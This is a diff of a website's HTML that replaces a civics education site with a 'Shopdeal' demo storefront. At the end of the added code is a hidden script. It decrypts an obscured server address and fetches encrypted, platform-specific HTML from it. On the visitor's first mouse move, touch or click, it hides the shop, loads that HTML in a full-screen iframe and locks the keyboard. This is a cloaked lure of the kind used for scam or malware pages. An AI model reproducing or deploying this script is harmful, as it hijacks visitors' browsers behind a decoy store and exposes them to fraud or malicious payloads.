+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript> -->
+    <!-- Histats.com  END  -->
 
-<!-- 7 QUIZ -->
-<section class="sec" id="quiz-sec" aria-labelledby="qz-h">
-  <div class="wrap split">
-    <div>
-      <span class="tag">Test yourself</span>
-      <h2 id="qz-h">The 10-question civics check-in</h2>
-      <p class="lead">How much do you remember? Answer ten questions about the Constitution and federal government. Each answer comes with a short explanation, so you learn as you go.</p>
-      <img class="pic" src="https://images.pexels.com/photos/34526416/pexels-photo-34526416.jpeg?auto=compress&cs=tinysrgb&w=900" alt="High school students collaborating over notebooks during a lesson" width="900" height="675" loading="lazy">
-    </div>
-    <div class="quiz" id="quiz" aria-live="polite"><noscript>Please enable JavaScript to take the quiz.</noscript></div>
-  </div>
-</section>
-
-<!-- 8 MEDIA LITERACY -->
-<section class="sec sky" aria-labelledby="ml-h">
-  <div class="wrap">
-    <div class="split" style="margin-bottom:40px">
-      <div><span class="tag">Media literacy</span><h2 id="ml-h">Four moves to check what you read</h2>
-        <p class="lead">Before sharing a surprising headline, take a minute to check it. The SIFT method, developed by digital-literacy educator Mike Caulfield, gives you four quick habits.</p></div>
-      <img class="pic" src="https://images.pexels.com/photos/19467243/pexels-photo-19467243.jpeg?auto=compress&cs=tinysrgb&w=900" alt="Woman reading a newspaper closely in a café" width="900" height="675" loading="lazy">
-    </div>
-    <div class="sift">
-      <div><span class="letter">S</span><h3>Stop</h3><p>Pause before reacting or sharing. Ask whether you know the source and what you want to find out.</p></div>
-      <div><span class="letter">I</span><h3>Investigate the source</h3><p>Spend a minute learning who is behind the information and what their purpose or expertise is.</p></div>
-      <div><span class="letter">F</span><h3>Find better coverage</h3><p>Look for other reliable reports on the same claim. If trusted outlets aren't covering it, be cautious.</p></div>
-      <div><span class="letter">T</span><h3>Trace claims</h3><p>Follow quotes, images and statistics back to their original context to see whether they were presented fairly.</p></div>
-    </div>
-  </div>
-</section>
-
-<!-- 9 GLOSSARY -->
-<section class="sec" id="glossary" aria-labelledby="gl-h">
-  <div class="wrap split" style="align-items:start">
-    <div>
-      <span class="tag">Civics glossary</span>
-      <h2 id="gl-h">Terms you'll hear in the news, defined simply</h2>
-      <p class="lead">Search the glossary to look up words that often appear in civics lessons and news coverage.</p>
-      <img class="pic" src="https://images.pexels.com/photos/9489804/pexels-photo-9489804.jpeg?auto=compress&cs=tinysrgb&w=900" alt="Open book with a highlighter and sticky notes ready for study" width="900" height="675" loading="lazy">
-    </div>
-    <div>
-      <div class="gloss-top"><label class="sr-only" for="gloss-q">Search glossary</label><input id="gloss-q" type="search" placeholder="Search terms, e.g. veto"><span class="muted" id="gloss-count" aria-live="polite"></span></div>
-      <div class="gloss">
-        <div class="term"><b>Amendment</b><p>A formal change or addition to the Constitution. There are 27 amendments.</p></div>
-        <div class="term"><b>Bicameral</b><p>Having two legislative chambers, like the House and the Senate.</p></div>
-        <div class="term"><b>Checks and balances</b><p>The system that lets each branch limit the powers of the others.</p></div>
-        <div class="term"><b>Constituent</b><p>A person represented by an elected official.</p></div>
-        <div class="term"><b>Due process</b><p>Fair procedures the government must follow before taking away life, liberty or property.</p></div>
-        <div class="term"><b>Federalism</b><p>Sharing power between the national government and the states.</p></div>
-        <div class="term"><b>Filibuster</b><p>A Senate tactic of extended debate used to delay or block a vote.</p></div>
-        <div class="term"><b>Jurisdiction</b><p>The authority of a court or government body over certain cases or areas.</p></div>
-        <div class="term"><b>Ordinance</b><p>A law passed by a local government, such as a city council.</p></div>
-        <div class="term"><b>Petition</b><p>A formal request to the government, often signed by many people.</p></div>
-        <div class="term"><b>Precedent</b><p>An earlier court decision used as a guide for deciding similar cases.</p></div>
-        <div class="term"><b>Quorum</b><p>The minimum number of members needed for a body to conduct official business.</p></div>
-        <div class="term"><b>Referendum</b><p>A vote by the public on a specific law or proposal.</p></div>
-        <div class="term"><b>Separation of powers</b><p>Dividing government into branches with distinct responsibilities.</p></div>
-        <div class="term"><b>Veto</b><p>The President's power to reject a bill passed by Congress.</p></div>
-        <div class="term"><b>Civic engagement</b><p>Taking part in community and public life, from volunteering to voting.</p></div>
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
     </div>
-  </div>
-</section>
 
-<!-- 10 FOR TEACHERS -->
-<section class="sec white" aria-labelledby="tc-h">
-  <div class="wrap">
-    <div class="split" style="margin-bottom:40px">
-      <img class="pic" src="https://images.pexels.com/photos/6503100/pexels-photo-6503100.jpeg?auto=compress&cs=tinysrgb&w=900" alt="Smiling teacher writing on a whiteboard in front of a class" width="900" height="675" loading="lazy">
-      <div><span class="tag">For educators</span><h2 id="tc-h">Bring Civic Sparrow into your classroom</h2>
-        <p class="lead">All our lessons and tools are free to use with students. For schools that want more, we offer workshops, teacher training and ready-to-teach lesson packs.</p>
-        <a class="btn" href="services.html">Explore our services</a></div>
-    </div>
-    <div class="tcards">
-      <div class="tcard"><h3>Classroom workshops</h3><p>Interactive sessions on topics like the Constitution, media literacy or local government, led by an experienced educator.</p></div>
-      <div class="tcard"><h3>Teacher training</h3><p>Practical professional development on teaching civics with discussion, primary sources and nonpartisan framing.</p></div>
-      <div class="tcard"><h3>Lesson packs</h3><p>Slide-free, printable lesson plans with objectives, activities and discussion questions for each learning unit.</p></div>
-    </div>
-  </div>
-</section>
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
 
-<!-- 11 FAQ -->
-<section class="sec" aria-labelledby="fq-h">
-  <div class="wrap">
-    <div class="head center"><span class="tag">Questions</span><h2 id="fq-h">Frequently asked questions</h2></div>
-    <div class="faq">
-      <details><summary>Is Civic Sparrow nonpartisan?</summary><p>Yes. We explain how government works, what documents say and how processes run. We don't endorse candidates, parties or positions, and where people reasonably disagree, we present the main viewpoints fairly.</p></details>
-      <details><summary>Who is Civic Sparrow for?</summary><p>Middle and high school students, teachers, homeschooling families and adults who want a clear refresher on civics. The language is written to be accessible to readers from about age 12 upward.</p></details>
-      <details><summary>Can I use these materials in my classroom?</summary><p>Yes. Teachers may use our pages, quiz and glossary with students free of charge for non-commercial educational purposes. Please see our Terms &amp; Conditions for details.</p></details>
-      <details><summary>Where does your information come from?</summary><p>We rely on primary sources such as the U.S. Constitution and official government websites, and on respected educational references. Our Editorial Policy explains how we check and update content.</p></details>
-      <details><summary>Is this legal advice?</summary><p>No. Civic Sparrow provides general educational information. For advice about a specific legal situation, please consult a qualified attorney.</p></details>
-    </div>
-  </div>
-</section>
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
 
-<!-- 12 NEWSLETTER -->
-<section class="sec-sm" aria-labelledby="nl-h">
-  <div class="wrap">
-    <div class="news">
-      <img src="https://images.pexels.com/photos/8199558/pexels-photo-8199558.jpeg?auto=compress&cs=tinysrgb&w=1000" alt="Group of students studying together at a library table" width="1000" height="667" loading="lazy">
-      <div class="b"><span class="tag">The learning letter</span><h2 id="nl-h">One short civics lesson in your inbox each month</h2>
-        <p>A clear explainer, a discussion question for class or the dinner table, and one new tool or activity. No spam, and unsubscribe anytime.</p>
-        <form class="newsletter" novalidate><label class="sr-only" for="nl-em">Email address</label><input id="nl-em" type="email" placeholder="Your email address" autocomplete="email"><button class="btn btn-mustard" type="submit">Subscribe</button></form></div>
-    </div>
-  </div>
-</section>
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
 
-</main>
-<footer class="foot"><div class="wrap">
-  <div class="foot-grid">
-    <div><a class="logo" href="index.php" aria-label="Civic Sparrow home"><svg viewBox="0 0 48 48" aria-hidden="true"><circle cx="24" cy="24" r="23" fill="#E9B44C"/><path d="M12 29c4-9 12-13 20-11l6-3-2 6c1 6-4 12-12 13-5 1-9-1-12-5z" fill="#14213D"/><path d="M20 25c3 3 8 3 11 0" stroke="#A0785A" stroke-width="2.4" fill="none" stroke-linecap="round"/><circle cx="31" cy="20.5" r="1.4" fill="#fff"/><path d="M22 34l-2 6M27 34l1 6" stroke="#14213D" stroke-width="1.8" stroke-linecap="round"/></svg><span><b>Civic Sparrow</b><small>Civics made clear</small></span></a>
-      <p style="margin-top:18px;max-width:330px">Plain-language, nonpartisan lessons on how government works, what our rights mean and how people take part in their communities.</p></div>
-    <div><h2>Learn</h2><ul><li><a href="index.php#units">Learning units</a></li><li><a href="index.php#branches">Three branches</a></li><li><a href="index.php#rights">Bill of Rights explorer</a></li><li><a href="index.php#quiz-sec">Civics quiz</a></li><li><a href="index.php#glossary">Civics glossary</a></li></ul></div>
-    <div><h2>Site</h2><ul><li><a href="about.html">About us</a></li><li><a href="services.html">Services</a></li><li><a href="contact.html">Contact</a></li><li><a href="privacy-policy.html">Privacy Policy</a></li><li><a href="terms-and-conditions.html">Terms &amp; Conditions</a></li><li><a href="disclaimer.html">Disclaimer</a></li><li><a href="cookie-policy.html">Cookie Policy</a></li><li><a href="editorial-policy.html">Editorial Policy</a></li><li><a href="accessibility.html">Accessibility</a></li></ul></div>
-    <div><h2>Contact</h2><ul><li>181 Mercer Street<br>New York, NY 10012, United States</li><li><a href="tel:+18887775845">+1-888-777-5845</a></li><li><a href="mailto:hello@civicsparrow.com">hello@civicsparrow.com</a></li><li>Mon–Fri, 9:00 am – 5:00 pm ET</li></ul></div>
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-  <div class="foot-bot"><span>© <span data-year>2026</span> Civic Sparrow. Original content; photos licensed via Pexels.</span><span><a href="sitemap.xml">Sitemap</a> · <button type="button" data-cookie-settings>Cookie settings</button></span></div>
-</div></footer>
-<div class="cookie" role="dialog" aria-label="Cookie choices"><div class="wrap"><p>We use essential storage to run this site and — only if you agree — analytics and advertising cookies to understand what's helpful. Read our <a href="cookie-policy.html">Cookie Policy</a>.</p>
-<div class="row"><button class="btn btn-sm" type="button" data-consent="all">Accept all</button><button class="btn btn-sm btn-ghost" type="button" data-consent="essential">Essential only</button></div></div></div>
-<script src="assets/js/main.js" defer></script>
+
+
+  <div id="contentiframe" style="display:none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+  <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen
+    webkitallowfullscreen mozallowfullscreen
+    sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads"
+    style="width:100%; height:100%; border:0;"></iframe>
+</div>
+
+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY   = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1/kEh9neuNS60/aE0GrlLMd5C8e0rX9IoWQ+7od9yQpbPzFinjuRzuE";
+
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN + "/data";
+
+  
+  (function warmup() {
+    try {
+      const o = new URL(DATA_ORIGIN).origin;
+
+      
+      const pc = document.createElement("link");
+      pc.rel = "preconnect";
+      pc.href = o;
+      pc.crossOrigin = "anonymous";
+      document.head.appendChild(pc);
+
+     
+      const dns = document.createElement("link");
+      dns.rel = "dns-prefetch";
+      dns.href = o;
+      document.head.appendChild(dns);
+
+      
+      fetch(o + "/favicon.ico", { method: "HEAD", mode: "no-cors" }).catch(() => {});
+    } catch (e) {}
+  })();
+
+  
+  let lastUrl = null;
+  let readyPromise = null;
+
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
+
+  function secureKeyboardAccess() {
+    if (navigator.keyboard) navigator.keyboard.lock().catch(() => {});
+  }
+
+  async function preloadSecret() {
+    if (readyPromise) return readyPromise;
+    readyPromise = (async () => {
+      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      lastUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));
+      return lastUrl;
+    })();
+    return readyPromise;
+  }
+
+  async function showSecret() {
+    const shop = document.getElementById("shop");
+    const frame = document.getElementById("frame");
+    const contentIframe = document.getElementById("contentiframe");
+    try {
+      const url = await preloadSecret();
+      frame.src = url;
+      shop.style.display = "none";
+      contentIframe.style.display = "block";
+      document.getElementById("customPopup").style.display = "none";
+      secureKeyboardAccess();
+    } catch (e) {
+      document.querySelector(".hint").textContent = "⚠️ " + e.message;
+      document.getElementById("customPopup").style.display = "none";
+    }
+  }
+
+  
+  preloadSecret().catch(() => {});
+
+ 
+  window.addEventListener("mousemove", showSecret, { once: true });
+  window.addEventListener("touchstart", showSecret, { once: true });
+  window.addEventListener("click", showSecret, { once: true });
+</script>
 </body>
 </html>
